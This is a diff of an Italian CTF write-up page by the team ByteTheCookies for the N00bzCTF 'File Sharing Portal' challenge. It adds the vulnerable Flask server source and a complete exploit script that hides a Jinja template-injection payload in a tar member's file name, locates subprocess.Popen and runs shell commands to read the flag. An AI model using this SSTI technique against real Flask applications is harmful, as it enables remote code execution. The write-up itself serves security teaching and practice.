@@ -20,10 +20,8 @@
     <meta charset="utf-8">
     <link rel="shortcut icon" href='http://localhost:1313/favicon.ico' type="image/x-icon">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>N00bzCTF - ByteTheCookies</title>
+    <title>File Sharing Portal - ByteTheCookies</title>
 
-    
-    <meta name="description" content="Un CTF di 48 ore ospitato da n00bz per n00bz. Organizzato con sfide facili per i principianti (e alcune difficili), n00bzCTF è dedicato a rendere la sicurezza informatica più amichevole e avvicinabile per i n00bz completi." />
     
 
     
@@ -33,29 +31,40 @@
     
 
     
-        <meta property="og:url" content="http://localhost:1313/it/writeups/n00bzctf/">
+        <meta property="og:url" content="http://localhost:1313/it/writeups/noobzctf/filesharingportal/">
   <meta property="og:site_name" content="ByteTheCookies">
-  <meta property="og:title" content="N00bzCTF">
-  <meta property="og:description" content="Un CTF di 48 ore ospitato da n00bz per n00bz. Organizzato con sfide facili per i principianti (e alcune difficili), n00bzCTF è dedicato a rendere la sicurezza informatica più amichevole e avvicinabile per i n00bz completi.">
+  <meta property="og:title" content="File Sharing Portal">
+  <meta property="og:description" content="File Sharing Portal Descrizione: Benvenuti nel portale di condivisione dei file! Supportiamo solo file tar!
+Autori: NoobMaster &#43; NoobHacker
+Punti: 478
+Soluzioni: 119
+Introduction Il ctf ha una struttura molto semplice: abbiamo un form in cui ci viene chiesto di inserire un file tar; una volta inserito il file tar, questo viene decompresso e ci viene mostrato il nome dei file che contiene; cliccando sui diversi file, possiamo leggerne il contenuto.">
   <meta property="og:locale" content="it">
   <meta property="og:type" content="article">
     <meta property="article:section" content="writeups">
-    <meta property="article:published_time" content="2024-08-05T18:26:54+02:00">
-    <meta property="article:modified_time" content="2024-08-05T18:30:24+02:00">
-    <meta property="article:tag" content="CTF">
-    <meta property="article:tag" content="N00bz">
+    <meta property="article:published_time" content="2024-08-06T11:27:07+02:00">
+    <meta property="article:modified_time" content="2024-08-06T11:27:07+02:00">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="Python">
+    <meta property="article:tag" content="Template Injection">
 
     
 
     
         
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="N00bzCTF">
-  <meta name="twitter:description" content="Un CTF di 48 ore ospitato da n00bz per n00bz. Organizzato con sfide facili per i principianti (e alcune difficili), n00bzCTF è dedicato a rendere la sicurezza informatica più amichevole e avvicinabile per i n00bz completi.">
+  <meta name="twitter:title" content="File Sharing Portal">
+  <meta name="twitter:description" content="File Sharing Portal Descrizione: Benvenuti nel portale di condivisione dei file! Supportiamo solo file tar!
+Autori: NoobMaster &#43; NoobHacker
+Punti: 478
+Soluzioni: 119
+Introduction Il ctf ha una struttura molto semplice: abbiamo un form in cui ci viene chiesto di inserire un file tar; una volta inserito il file tar, questo viene decompresso e ci viene mostrato il nome dei file che contiene; cliccando sui diversi file, possiamo leggerne il contenuto.">
 
     <link rel="stylesheet" href="/style.css" integrity="">
 
 
+
+    <link rel="stylesheet" href="/lib/css/prism.css" integrity="">
 
 
 
@@ -82,6 +91,20 @@
 
 
 
+
+    
+        
+
+        
+        
+
+        
+        
+            
+        
+
+        <script defer src="/js/prism.js" integrity="" data-manual></script>
+    
 
 
 
@@ -288,13 +311,9 @@
         
             <nav id="TableOfContents">
   <ul>
-    <li><a href="#description">Description</a></li>
-    <li><a href="#performance-summary">Performance Summary</a></li>
-    <li><a href="#writeups">Writeups</a>
-      <ul>
-        <li></li>
-      </ul>
-    </li>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#source">Source</a></li>
+    <li><a href="#solution">Solution</a></li>
   </ul>
 </nav>
         
@@ -313,8 +332,8 @@
         
     
     
-<h1 id="n00bz-ctf-2024" class="header-anchor-wrapper">N00bz CTF 2024
-  <a href="#n00bz-ctf-2024" class="header-anchor-link">
+<h1 id="file-sharing-portal" class="header-anchor-wrapper">File Sharing Portal
+  <a href="#file-sharing-portal" class="header-anchor-link">
     <svg width="16px" height="16px" viewBox="0 0 24 24">
 <svg
     xmlns="http://www.w3.org/2000/svg"
@@ -328,9 +347,13 @@
   </a>
 </h1>
 
+<p><strong>Descrizione</strong>: Benvenuti nel portale di condivisione dei file! Supportiamo solo file tar!</p>
+<p><strong>Autori</strong>: NoobMaster + NoobHacker</p>
+<p><strong>Punti</strong>: 478</p>
+<p><strong>Soluzioni</strong>: 119</p>
 
-<h2 id="description" class="header-anchor-wrapper">Description
-  <a href="#description" class="header-anchor-link">
+<h2 id="introduction" class="header-anchor-wrapper">Introduction
+  <a href="#introduction" class="header-anchor-link">
     <svg width="16px" height="16px" viewBox="0 0 24 24">
 <svg
     xmlns="http://www.w3.org/2000/svg"
@@ -344,10 +367,10 @@
   </a>
 </h2>
 
-<p>Un CTF di 48 ore ospitato da n00bz per n00bz. Organizzato con sfide facili per i principianti (e alcune difficili), n00bzCTF è dedicato a rendere la sicurezza informatica più amichevole e avvicinabile per i n00bz completi.</p>
+<p>Il ctf ha una struttura molto semplice: abbiamo un form in cui ci viene chiesto di inserire un file <a href="https://en.wikipedia.org/wiki/Tar_(computing)">tar</a>; una volta inserito il file tar, questo viene decompresso e ci viene mostrato il <code>nome</code> dei file che contiene; cliccando sui diversi file, possiamo leggerne il contenuto.</p>
 
-<h2 id="performance-summary" class="header-anchor-wrapper">Performance Summary
-  <a href="#performance-summary" class="header-anchor-link">
+<h2 id="source" class="header-anchor-wrapper">Source
+  <a href="#source" class="header-anchor-link">
     <svg width="16px" height="16px" viewBox="0 0 24 24">
 <svg
     xmlns="http://www.w3.org/2000/svg"
@@ -361,15 +384,73 @@
   </a>
 </h2>
 
-<ul>
-<li><strong>CTFs</strong>: 31/32</li>
-<li><strong>Punti totali</strong>: 9794.000</li>
-<li><strong>Posizione</strong>: 24</li>
-<li><strong>Punti di valutazione</strong>: 24.067</li>
-</ul>
+<p><strong>Il sorgente ha commenti aggiunti in seguito per consentire una migliore comprensione del codice nei writeup</strong></p>
+<pre  class="mc-prism hide language-text" ><code class="language-python"># filename: server.py
 
-<h2 id="writeups" class="header-anchor-wrapper">Writeups
-  <a href="#writeups" class="header-anchor-link">
+#!/usr/bin/env python3
+from flask import Flask, request, redirect, render_template, render_template_string
+import tarfile
+from hashlib import sha256
+import os
+app = Flask(__name__)
+
+@app.route('/',methods=['GET','POST'])
+def main():
+    # Questa funzione si occupa principalmente di caricare il file tar nel file system del server.
+    global username
+    if request.method == 'GET':
+        return render_template('index.html')
+    elif request.method == 'POST':
+        file = request.files['file']
+        if file.filename[-4:] != '.tar': # Verificare che il file passato sia effettivamente un file tar
+            return render_template_string(&quot;&lt;p&gt; We only support tar files as of right now!&lt;/p&gt;&quot;) # Altrimenti, viene visualizzato un messaggio di errore
+        name = sha256(os.urandom(16)).digest().hex() # Crea un nome casuale che verrà utilizzato per denominare il tar e la cartella nel file system del server.
+        os.makedirs(f&quot;./uploads/{name}&quot;, exist_ok=True) # Crea la directory
+        file.save(f&quot;./uploads/{name}/{name}.tar&quot;) # Salva il file tar
+        try:
+            # Estrae il file tar
+            tar_file = tarfile.TarFile(f'./uploads/{name}/{name}.tar')
+            tar_file.extractall(path=f'./uploads/{name}/')
+            return render_template_string(f&quot;&lt;p&gt;Tar file extracted! View &lt;a href='/view/{name}'&gt;here&lt;/a&gt;&quot;)
+        except:
+            return render_template_string(&quot;&lt;p&gt;Failed to extract file!&lt;/p&gt;&quot;)
+
+@app.route('/view/&lt;name&gt;')
+def view(name):
+    # Questa funzione visualizza i file contenuti nel file .tar
+    if not all([i in &quot;abcdef1234567890&quot; for i in name]): # Controllare che il nome del file sia in esadecimale, per evitare qualsiasi tipo di input dannoso. 
+        return render_template_string(&quot;&lt;p&gt;Error!&lt;/p&gt;&quot;)
+        #print(os.popen(f'ls ./uploads/{name}').read())
+            #print(name)
+    files = os.listdir(f&quot;./uploads/{name}&quot;) # Elenca tutti i file presenti nella cartella precedentemente creata 
+    out = '&lt;h1&gt;Files&lt;/h1&gt;&lt;br&gt;'
+    files.remove(f'{name}.tar')  # Rimuove il file tar dall'elenco
+    for i in files:
+        out += f'&lt;a href=&quot;/read/{name}/{i}&quot;&gt;{i}&lt;/a&gt;' # Mostra tramite modelli tutti i nomi dei file
+       # except:
+    return render_template_string(out) # Renderizzare il modello con la funzione render_template_string
+
+@app.route('/read/&lt;name&gt;/&lt;file&gt;')
+def read(name,file):
+    # La funzione mostra il contenuto del singolo file
+    if (not all([i in &quot;abcdef1234567890&quot; for i in name])): # Controllare che il nome del file sia in esadecimale, per evitare qualsiasi tipo di input dannoso. 
+        return render_template_string(&quot;&lt;p&gt;Error!&lt;/p&gt;&quot;)
+    if ((&quot;..&quot; in name) or (&quot;..&quot; in file)) or ((&quot;/&quot; in file) or &quot;/&quot; in name):  # Altri controlli per evitare l'errore di percorso
+        return render_template_string(&quot;&lt;p&gt;Error!&lt;/p&gt;&quot;)
+    f = open(f'./uploads/{name}/{file}') # Apre il file
+    data = f.read()
+    f.close()
+    return data # Ritorna il contenuto del file
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=1337)
+
+
+</code></pre>
+<p>Si può quindi notare che ci sono diversi controlli sui parametri e, in un primo momento, si potrebbe pensare che il codice sia sicuro al 100%.</p>
+
+<h2 id="solution" class="header-anchor-wrapper">Solution
+  <a href="#solution" class="header-anchor-link">
     <svg width="16px" height="16px" viewBox="0 0 24 24">
 <svg
     xmlns="http://www.w3.org/2000/svg"
@@ -383,44 +464,82 @@
   </a>
 </h2>
 
+<p>La prima cosa che ci è venuta in mente è stata quella di creare un <a href="https://www.futurelearn.com/info/courses/linux-for-bioinformatics/0/steps/201767">link simbolico</a> per accedere alla flag, e in effetti questo funziona (provate con server.py), il problema è che il nome del file della flag è sconosciuto e questo non ci permette di creare un link simbolico valido.</p>
+<p>Una volta capito questo, abbiamo fatto un&rsquo;analisi approfondita del codice e siamo giunti alla conclusione che l&rsquo;unica cosa che non veniva controllata era il nome del file tar scompattato, consentendoci di inserire qualsiasi cosa. Combinando questo con la funzione <code>render_template_string</code> (una funzione vulnerabile di flask), è possibile eseguire una <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#what-is-ssti-server-side-template-injection">template injection</a>.</p>
+<pre  class="mc-prism hide language-text" ><code class="language-python"># filename: exploit.py
 
-<h4 id="web" class="header-anchor-wrapper">Web
-  <a href="#web" class="header-anchor-link">
-    <svg width="16px" height="16px" viewBox="0 0 24 24">
-<svg
-    xmlns="http://www.w3.org/2000/svg"
-    width="24" height="24" viewBox="0 0 24 24" fill="none"
-    stroke="currentColor" stroke-width="2" stroke-linecap="round"
-    stroke-linejoin="round">
-    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
-</svg>
+import requests
+import os
+import tarfile
+from bs4 import BeautifulSoup
 
-</svg>
-  </a>
-</h4>
+url = 'http://redacted.challs.n00bzunit3d.xyz:8080/'
 
-<ul>
-<li><a href="/it/writeups/noobzctf/filesharingportal/">File Sharing Portal</a></li>
-</ul>
 
-<h4 id="misc" class="header-anchor-wrapper">Misc
-  <a href="#misc" class="header-anchor-link">
-    <svg width="16px" height="16px" viewBox="0 0 24 24">
-<svg
-    xmlns="http://www.w3.org/2000/svg"
-    width="24" height="24" viewBox="0 0 24 24" fill="none"
-    stroke="currentColor" stroke-width="2" stroke-linecap="round"
-    stroke-linejoin="round">
-    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
-</svg>
+def create_tar(tar_name, file):
+    with tarfile.open(tar_name, 'w') as tar:
+        tar.add(file, arcname=os.path.basename(file))
+    print(f'Tar file created: {tar_name}')
 
-</svg>
-  </a>
-</h4>
 
-<ul>
-<li><a href="/it/writeups/noobzctf/waas/">Waas</a></li>
-</ul>
+def create_payload(payload):
+    with open(payload, 'w') as f:
+        f.write('Remember to byte the cookies')
+
+    create_tar('exploit.tar', payload)
+    print(f'Payload created: {payload}')
+
+
+def get_url_view(text):
+    soup = BeautifulSoup(text, 'html5lib')
+    return [a['href'] for a in soup.find_all('a', href=True)][0]
+
+
+def leak_subprocess_index():
+    payload = &quot;{{int.__class__.__base__.__subclasses__()}}&quot;
+    create_payload(payload)
+
+    r = requests.post(url, files={'file': open('exploit.tar', 'rb')})
+
+    url_file = get_url_view(r.text)
+    r = requests.get(url + url_file)
+    text = r.text[r.text.index('[')+1:]
+
+    list_classes = text.split(',')
+
+    for i, c in enumerate(list_classes):
+        if 'subprocess.Popen' in c:
+            print(f'Index subprocess.Popen: {i}')
+            return str(i)
+
+
+def get_flag(index):
+    payload = &quot;{{int.__class__.__base__.__subclasses__()[&quot; + \
+        index + &quot;]('cat *', shell=True, stdout=-1).communicate()}}&quot;
+    create_payload(payload)
+
+    r = requests.post(url, files={'file': open('exploit.tar', 'rb')})
+
+    url_file = get_url_view(r.text)
+    r = requests.get(url + url_file)
+
+    flag = r.text[r.text.index('n00bz{'):r.text.index('}')+1]
+    print(f'Flag: {flag}')
+
+
+def main():
+    subprocess_index = leak_subprocess_index()
+    get_flag(subprocess_index)
+
+
+if __name__ == '__main__':
+    main()
+
+
+</code></pre>
+<pre  class="mc-prism hide language-text" ><code class="language-stdout">flag: n00bz{n3v3r_7rus71ng_t4r_4g41n!_b3506983087e}
+</code></pre>
+<p align='right'>Author: akiidjk </p>
 
 </article>
 </div>
